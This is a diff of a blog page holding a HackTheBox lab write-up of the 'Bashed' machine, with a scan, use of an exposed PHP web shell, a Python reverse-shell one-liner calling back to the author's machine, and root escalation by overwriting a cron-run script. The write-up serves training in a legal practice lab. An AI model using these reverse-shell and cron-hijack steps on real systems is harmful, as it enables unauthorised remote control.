@@ -1,175 +1,187 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-  <meta http-equiv="content-type" content="text/html;charset=utf-8">
-  <meta http-equiv="X-UA-Compatible" content="chrome=1">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noodp"/>
-  
-  
-  
-  
-  
-  <link rel="prev" href="https://securingthe.net/2018/infosec-is-bigger-than-pentesting/" />
-  <link rel="next" href="https://securingthe.net/2019/starting-my-oscp-journey/" />
-  <link rel="canonical" href="https://securingthe.net/2018/hackthebox-bashed/" />
-  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
-  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-  <link rel="manifest" href="/site.webmanifest">
-  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-  <title>
-       
-       
-           HackTheBox Writeup: Bashed | Securing The Net
-       
-  </title>
-  <meta name="title" content="HackTheBox Writeup: Bashed | Securing The Net">
-    
-  
-  <link rel="stylesheet" href="/font/iconfont.css">
-  <link rel="stylesheet" href="/css/main.min.css">
-
-
-  <meta name="twitter:card" content="summary"/>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>HackTheBox Writeup: Bashed | Securing The Net</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noodp" />
+<meta name="Description" content="Tech ramblings from the desert">
+<link rel="prev" href="https://securingthe.net/2018/infosec-is-bigger-than-pentesting/" />
+<link rel="next" href="https://securingthe.net/2019/starting-my-oscp-journey/" />
+<link rel="canonical" href="https://securingthe.net/2018/hackthebox-bashed/" />
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="HackTheBox Writeup: Bashed"/>
 <meta name="twitter:description" content="As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker. The best way to learn is by doing, and one of my favorite ways to practice is HackTheBox.
 The machine named Bashed was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.
 Recon As usual with a HackTheBox target system, all you have at the onset is a name and IP address."/>
-
-  <script type="application/ld+json">
-{
-  "@context": "http://schema.org",
-  "@type": "BlogPosting",
-  "headline": "HackTheBox Writeup: Bashed",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https:\/\/securingthe.net\/2018\/hackthebox-bashed\/"
-  },
-  "image": {
-    "@type": "ImageObject",
-    "url": "https:\/\/securingthe.net\/green.png",
-    "width":  800 ,
-    "height":  600 
-  },
-  "genre": "posts",
-  "keywords": "Linux, HackTheBox",
-  "wordcount":  1325 ,
-  "url": "https:\/\/securingthe.net\/2018\/hackthebox-bashed\/",
-  "datePublished": "2018-05-05T02:47:50\x2b00:00",
-  "dateModified": "2018-05-05T02:47:50\x2b00:00",
-  
-  "publisher": {
-    "@type": "Organization",
-    "name": "AJ McQuay",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https:\/\/securingthe.net\/avatar.jpg",
-      "width":  300 ,
-      "height":  110 
+<script type="application/ld+json">
+    {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "HackTheBox Writeup: Bashed",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https:\/\/securingthe.net\/2018\/hackthebox-bashed\/"
+    },
+    
+        "image": {
+            "@type": "ImageObject",
+            "url": "https:\/\/securingthe.net\/green.png",
+            "width":  800 ,
+            "height":  600 
+        },
+    
+    "genre": "posts",
+    
+        "keywords": "Linux, HackTheBox",
+    
+    "wordcount":  1325 ,
+    "url": "https:\/\/securingthe.net\/2018\/hackthebox-bashed\/",
+    
+        "datePublished": "2018-05-05T02:47:50\x2b00:00",
+    
+    
+        "dateModified": "2018-05-05T02:47:50\x2b00:00",
+    
+    
+    
+        "publisher": {
+            "@type": "Organization",
+            "name": "AJ McQuay",
+            "logo": {
+            "@type": "ImageObject",
+            "url": "https:\/\/securingthe.net\/avatar.jpg",
+            "width":  300 ,
+            "height":  110 
+            }
+        },
+    
+    
+    "description": ""
     }
-  },
-  "author": {
-    "@type": "Person",
-    "name": "AJ McQuay"
-  },
-  "description": ""
-}
-</script>
-</head>
+    </script>
+<link rel="stylesheet" href="/css/style.min.css">
+<link rel="stylesheet" href="/css/lib/fontawesome-free/all.min.min.css">
 
-  
+<link rel="stylesheet" href="/css/lib/animate/animate.min.min.css">
 
 
-
-  <body class="">
-    <div class="wrapper">
-        <nav class="navbar">
-    <div class="container">
-        <div class="navbar-header header-logo">
-        	<a href="https://securingthe.net">Securing The Net</a>
+    </head>
+    <body>
+        <script>
+            window.isDark = (window.localStorage && window.localStorage.getItem('theme')) === 'dark';
+            window.isDark && document.body.classList.add('dark-theme');
+        </script>
+        <div class="wrapper">
+            <nav class="navbar">
+    <div class="navbar-container">
+        <div class="navbar-header animated bounceIn">
+            <a href="https://securingthe.net">Securing The Net</a>
         </div>
-        <div class="menu navbar-right">
-                
-                
-                <a class="menu-item" href="/posts/" title="">Blog</a>
-                
-                <a class="menu-item" href="/categories/" title="">Categories</a>
-                
-                <a class="menu-item" href="/posts/about/" title="">About</a>
-                
-                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        <div class="navbar-menu">
+            
+            
+                <a class="menu-item" href="https://securingthe.net/posts/" title="">Blog</a>
+            
+                <a class="menu-item" href="https://securingthe.net/categories/" title="">Categories</a>
+            
+                <a class="menu-item" href="https://securingthe.net/posts/about/" title="">About</a>
+            
+            <a href="javascript:void(0);" class="theme-switch"><i class="fas fa-adjust fa-rotate-180 fa-fw" title="Switch Theme"></i></a>
         </div>
     </div>
 </nav>
-<nav class="navbar-mobile" id="nav-mobile" style="display: none">
-     <div class="container">
+<nav class="navbar-mobile">
+     <div class="navbar-container">
         <div class="navbar-header">
-            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="https://securingthe.net">Securing The Net</a></div>
-            <div class="menu-toggle">
+            <div class="navbar-header-title animated bounceIn">
+                <a href="https://securingthe.net">Securing The Net</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle">
                 <span></span><span></span><span></span>
             </div>
         </div>
-     
-          <div class="menu" id="mobile-menu">
-                
-                
-                <a class="menu-item" href="/posts/" title="">Blog</a>
-                
-                <a class="menu-item" href="/categories/" title="">Categories</a>
-                
-                <a class="menu-item" href="/posts/about/" title="">About</a>
-                
+        <div class="navbar-menu" id="mobile-menu">
+            
+            
+                <a class="menu-item" href="https://securingthe.net/posts/" title="">Blog</a>
+            
+                <a class="menu-item" href="https://securingthe.net/categories/" title="">Categories</a>
+            
+                <a class="menu-item" href="https://securingthe.net/posts/about/" title="">About</a>
+            
+            <a href="javascript:void(0);" class="theme-switch"><i class="fas fa-adjust fa-rotate-180 fa-fw"></i></a>
         </div>
     </div>
-</nav>
+</nav><main class="main">
+                <div class="container">
+                    
+    
+    
+    
+       
+    
 
-    	 <main class="main">
-          <div class="container">
-      		
-<article class="post-warp">
-    <header class="post-header">
-        <h1 class="post-title">HackTheBox Writeup: Bashed</h1>
+    <article class="post-warp">
+        <h1 class="post-title animated flipInX">HackTheBox Writeup: Bashed</h1>
+
         <div class="post-meta">
-            Written by <a href="https://securingthe.net" rel="author">AJ McQuay</a> with ♥ 
-                <span class="post-time">
-                    on <time datetime=2018-05-05 >5 May 2018</time>
-                </span>
-                in
-                <i class="iconfont icon-folder"></i>
+            <div class="post-meta-main">
+                <a class="author" href="https://securingthe.net" rel="author"><i class="fas fa-user-circle fa-fw"></i>AJ McQuay&nbsp;</a>
                 <span class="post-category">
-                        <a href="https://securingthe.net/categories/linux/"> Linux </a>
-                        <a href="https://securingthe.net/categories/hackthebox/"> HackTheBox </a>
-                        
-                </span>
-                <i class="iconfont icon-timer"></i>
-                7 min
+                        included in
+                        <i class="far fa-folder fa-fw"></i><a href="https://securingthe.net/categories/linux/">Linux</a>
+                            <i class="far fa-folder fa-fw"></i><a href="https://securingthe.net/categories/hackthebox/">HackTheBox</a>
+                            
+                    </span>
+            </div>
+            <div class="post-meta-other">
+                <i class="far fa-calendar-alt fa-fw"></i><time datetime=2018-05-05>2018-05-05</time>&nbsp;
+                <i class="fas fa-pencil-alt fa-fw"></i>about 1325 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>7 min&nbsp;</div>
         </div>
-    </header>
-    <div class="post-content">
+
         
 
         
+
+        <div class="post-content">
             
-        
-
-        
-        
-     
-          
-          
-          
-
-          
-          
-          
-
-          <p>As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker.  The best way to learn is by doing, and one of my favorite ways to practice is <a href="https://hackthebox.eu">HackTheBox</a>.</p>
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            <p>As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker.  The best way to learn is by doing, and one of my favorite ways to practice is <a href="https://hackthebox.eu">HackTheBox</a>.</p>
 <p>The machine named <em>Bashed</em> was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.</p>
-<h1 id="recon">Recon</h1>
+<a class="post-dummy-target" id="recon"></a><h1>Recon</h1>
 <p>As usual with a HackTheBox target system, all you have at the onset is a name and IP address. My starting point is usually an nmap scan against the target machine&rsquo;s IP.</p>
 <pre><code>nmap -sC -sV -oA nmap 10.10.10.68
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:05 EST
@@ -199,21 +211,21 @@ PORT   STATE SERVICE
 |_  /uploads/: Potentially interesting folder
 Nmap done: 1 IP address (1 host up) scanned in 46.16 seconds
 </code></pre><p>The /dev directory contains a couple of scripts.  Visiting http://10.10.10.68/dev/phpbash.php in a browser presented me with a web shell (!).  I&rsquo;m able to navigate the file structure and read the contents of /home.  Getting user.txt is a simple exercise at this point.</p>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/content/images/2018/05/bashed_user.png" alt="bashed_user" class="lazyload"><figcaption class="image-caption">bashed_user</figcaption></figure></p>
+<p><img src="/content/images/2018/05/bashed_user.png" alt="bashed_user"></p>
 <p><strong>user = owned</strong></p>
-<h1 id="gaining-a-foothold">Gaining a Foothold</h1>
+<a class="post-dummy-target" id="gaining-a-foothold"></a><h1>Gaining a Foothold</h1>
 <p>I need to get a &ldquo;real&rdquo; shell on the box to go any further. I choose one of my favorite reverse shell one-liners and see if it will work from the PHP web shell.</p>
 <p>First, I&rsquo;ll need a listener on my local attacker machine:</p>
 <pre><code>nc -v -n -l -p 4444
 </code></pre><p>Now I drop this python script directly in the web shell.  The ampersand (&amp;) at the end just backgrounds the process.</p>
 <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;my HTB IP address&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &amp;
 </code></pre><p>Note that the field &ldquo;my HTB IP address&rdquo; would be the 10.10.x.x IP assigned to the VPN interface on my machine (usually tap0 on Kali Linux) when I&rsquo;m connected to the HTB environment, and the port number (4444) is the same one I used to start the netcat listener in the previous step.</p>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/content/images/2018/05/bashed_revshell1.png" alt="bashed_revshell1" class="lazyload"><figcaption class="image-caption">bashed_revshell1</figcaption></figure></p>
+<p><img src="/content/images/2018/05/bashed_revshell1.png" alt="bashed_revshell1"></p>
 <p>Now I have a reverse shell on the target system, but it&rsquo;s still limited. I try using python again to escape to a bash shell.</p>
 <pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
-</code></pre><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/content/images/2018/05/bashed_revshell2.png" alt="bashed_revshell2" class="lazyload"><figcaption class="image-caption">bashed_revshell2</figcaption></figure></p>
+</code></pre><p><img src="/content/images/2018/05/bashed_revshell2.png" alt="bashed_revshell2"></p>
 <p>Great, now I&rsquo;m at a more typical shell as user www-data.  Time to enumerate.</p>
-<h1 id="enumeration">Enumeration</h1>
+<a class="post-dummy-target" id="enumeration"></a><h1>Enumeration</h1>
 <p>I checked many many things, but looking at sudo capabilities turned up some useful information.</p>
 <pre><code>www-data@bashed:/var/www/html/dev$ sudo -l
 sudo -l
@@ -268,16 +280,16 @@ drwxr-xr-x 23 root          root          4096 Dec  4 13:02 ..
 -rw-r--r--  1 root          root            12 Apr 20 08:18 test.txt
 </code></pre><p>Examining these two files leads me to believe that <code>test.txt</code> containts output from the <code>test.py</code> script.  However,<code>test.txt</code> is owned by root while the directory it resides in and the <code>test.py</code> script that generates it are owned by scriptmanager.</p>
 <p>This implies that root is executing the script as itself, so the output is written with root ownership. If I can replace <code>test.py</code> with my own malicious version I can do something on the target machine with root privileges. Reverse shell time!</p>
-<h1 id="privilege-escalation">Privilege Escalation</h1>
+<a class="post-dummy-target" id="privilege-escalation"></a><h1>Privilege Escalation</h1>
 <pre><code>scriptmanager@bashed:/scripts$ mv test.py old-test.py
 scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;my HTB IP address&gt;&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &gt; test.py
 </code></pre><p>Here I moved/renamed the existing <code>test.py</code> and created my own with the reverse shell code. This isn&rsquo;t necessary, you could just add the reverse shell bits to the end of the existing file.</p>
 <p>Again note the &ldquo;my HTB IP address field&rdquo; and port number. I want a second reverse shell that&rsquo;s separate from the one I&rsquo;m currently working in, so I selected a new port (5555).</p>
 <p>I&rsquo;m not exactly sure how or when root executes the <code>test.py</code> script.  Given the autonomous nature of these HTB systems I assume it&rsquo;s just a cron job. I start a netcat listener on this new port on my local attacker machine and wait.</p>
 <p>After a few minutes&hellip;</p>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png" alt="94582eeb-e301-49ba-9bf2-64769b24438c" class="lazyload"><figcaption class="image-caption">94582eeb-e301-49ba-9bf2-64769b24438c</figcaption></figure></p>
+<p><img src="/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png" alt="94582eeb-e301-49ba-9bf2-64769b24438c"></p>
 <p><strong>root = owned</strong></p>
-<h1 id="conclusion">Conclusion</h1>
+<a class="post-dummy-target" id="conclusion"></a><h1>Conclusion</h1>
 <p>Looking back Bashed was a pretty simple machine, but there were two primary lessons I learned from it:</p>
 <ol>
 <li>Look at the simple or obvious things first.  Don&rsquo;t assume every target is going to require some elaborate, complicated method to exploit.</li>
@@ -285,143 +297,139 @@ scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket
 </ol>
 <p>Did you conquer Bashed using some other method?  Feel free to reach out to me on <a href="https://twitter.com/aj_mcquay">Twitter</a>, I&rsquo;d love to talk about it.</p>
 
-    </div>
+        </div>
 
-    <div class="post-copyright">
-             
-            <p class="copyright-item">
-                <span>Author:</span>
-                <span>AJ McQuay </span>
-                </p>
-            
-           
-            <p class="copyright-item">
-                    <span>Words:</span>
-                   <span>1325</span>
-            </p>
-            
-            <p class="copyright-item">
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>This article is updated with 2018-05-05</span>
+            </div>
+            <div class="post-info-license">
                 
-                <span>Share:</span>
-                <span>
-
-      
+            </div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md">
+                
+            </div>
+            <div class="post-info-share">
+                
+                    <span>
+    
         <a href="//twitter.com/share?url=https%3a%2f%2fsecuringthe.net%2f2018%2fhackthebox-bashed%2f&amp;text=HackTheBox%20Writeup%3a%20Bashed&amp;via=x41x4a" target="_blank" title="Share on Twitter">
-          <i class="iconfont icon-twitter"></i>
+            <i class="fab fa-twitter fa-fw"></i>
         </a>
-        
-      
-      
-      
-      
+    
+    
+    
         <a href="//reddit.com/submit?url=https%3a%2f%2fsecuringthe.net%2f2018%2fhackthebox-bashed%2f&amp;title=HackTheBox%20Writeup%3a%20Bashed" target="_blank" title="Share on Reddit">
-          <i class="iconfont icon-reddit"></i>
+            <i class="fab fa-reddit fa-fw"></i>
         </a>
-        
-      
-      
+    
+    
         <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fsecuringthe.net%2f2018%2fhackthebox-bashed%2f&amp;title=HackTheBox%20Writeup%3a%20Bashed" target="_blank" title="Share on LinkedIn">
-          <i class="iconfont icon-linkedin"></i>
+            <i class="fab fa-linkedin fa-fw"></i>
         </a>
-        
-      
-      
-        
-      
-        
-      
-
-          
-
-          
-
-          
-
-          
+    
+    
+    
+    
+    
+    
+    
 </span>
                 
-            </p>
-
-             
-            <p class="copyright-item">
-                Released under <a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a>
-            </p>
-            
+            </div>
+        </div>
     </div>
 
-  
-    <div class="post-tags">
-        
-            <section>
-            <i class="iconfont icon-icon-tag"></i>Tag: 
-            
-            <span class="tag"><a href="https://securingthe.net/tags/linux/">
-                    #Linux</a></span>
-            
-            <span class="tag"><a href="https://securingthe.net/tags/hackthebox/">
-                    #HackTheBox</a></span>
-            
-            </section>
-        
+    <div class="post-info-more">
         <section>
-                <a href="javascript:window.history.back();">Back</a></span> · 
-                <span><a href="https://securingthe.net">Home</a></span>
+            
+                
+                    <span class="tag">
+                        <a href="https://securingthe.net/tags/linux/"><i class="fas fa-tag fa-fw"></i>Linux</a>
+                    </span>
+                
+                    <span class="tag">
+                        <a href="https://securingthe.net/tags/hackthebox/"><i class="fas fa-tag fa-fw"></i>HackTheBox</a>
+                    </span>
+                
+            
+        </section>
+        <section>
+            <span><a href="javascript:window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="https://securingthe.net">Home</a></span>
         </section>
     </div>
 
     <div class="post-nav">
         
-        <a href="https://securingthe.net/2018/infosec-is-bigger-than-pentesting/" class="prev" rel="prev" title="InfoSec is Bigger Than Pentesting"><i class="iconfont icon-dajiantou"></i>&nbsp;InfoSec is Bigger Than Pentesting</a>
-         
+            <a href="https://securingthe.net/2018/infosec-is-bigger-than-pentesting/" class="prev" rel="prev" title="InfoSec is Bigger Than Pentesting"><i class="fas fa-angle-left fa-fw"></i>InfoSec is Bigger Than Pentesting</a>
         
-        <a href="https://securingthe.net/2019/starting-my-oscp-journey/" class="next" rel="next" title="Starting my OSCP journey">Starting my OSCP journey&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
+        
+            <a href="https://securingthe.net/2019/starting-my-oscp-journey/" class="next" rel="next" title="Starting my OSCP journey">Starting my OSCP journey<i class="fas fa-angle-right fa-fw"></i></a>
         
     </div>
+</div>
 
-    <div class="post-comment">
-          
-          <div id="disqus_thread"></div>
-  <script type="text/javascript">
-      (function() {
-          
-          
-          if (window.location.hostname == "localhost")
-              return;
-          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-          var disqus_shortname = 'ajmcquay';
-          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-      })();
-  </script>
-  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-  <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        <div class="post-comment">
+            
+            
 
- 
-
-          
-    </div>
-</article>
-          </div>
-		   </main>
-      <footer class="footer">
+            
+        </div>
+    </article></div>
+            </main>
+            <footer class="footer">
     <div class="copyright">
-        &copy;
-        
-        <span itemprop="copyrightYear">2018 - 2020</span>
-        
-         
-            <span class="author" itemprop="copyrightHolder"><a href="https://securingthe.net">AJ McQuay</a> | </span>
-         
-
-		 
+        <div class="copyright-line">
+            Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="external nofollow noopener noreffer">LoveIt<i class="far fa-heart fa-fw"></i></a>
+        </div>
+        <div class="copyright-line">
+            <i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2018 - 2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://securingthe.net">AJ McQuay</a></span><span class="license">&nbsp;|&nbsp;Released under <a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
     </div>
 </footer>
 
 
+    
+    
 
 
 
 
+    
+    
+
+
+
+
+    
+    
+
+
+
+
+
+    
+    
+
+
+
+    
+    
+
+
+
+    
+    
+
+
+
+
+
+    
+    
 
 
 
@@ -429,16 +437,71 @@ scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket
 
 
     
-    <link crossorigin="anonymous" integrity="sha384-yziQACfvCVwLqVFLqkWBYRO3XeA4EqzfXKGwaWnenYn5XzqfJFlFdKEmvutIQdKb" href="https://lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css" rel="stylesheet">
-      
-     <script src="/js/vendor_gallery.min.js" async="" ></script>
     
-  
+
+
+
+    
+    
 
 
 
 
 
+    
+    
+
+
+
+
+    
+    
+
+
+
+
+    
+    
+
+
+
+    
+    
+
+
+
+
+
+    
+    
+
+
+<script src="/js/lib/jquery/jquery.slim.min.min.js"></script>
+<script src="/js/lib/lazysizes/lazysizes.min.min.js"></script>
+<script src="/js/lib/smooth-scroll/smooth-scroll.polyfills.min.min.js"></script><script>window.scroll = new SmoothScroll('[data-scroll]', {speed: 300, speedAsDuration: true});</script>
+
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+
+
+
+
+<script src="/js/blog.min.js"></script>
+
+
+    
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -450,8 +513,7 @@ if (!doNotTrack) {
 </script>
 <script async src='https://www.google-analytics.com/analytics.js'></script>
 
-
-
-     </div>
-  </body>
+</div>
+        <a href="#" class="dynamic-to-top" id="dynamic-to-top" data-scroll><span>&nbsp;</span></a>
+    </body>
 </html>
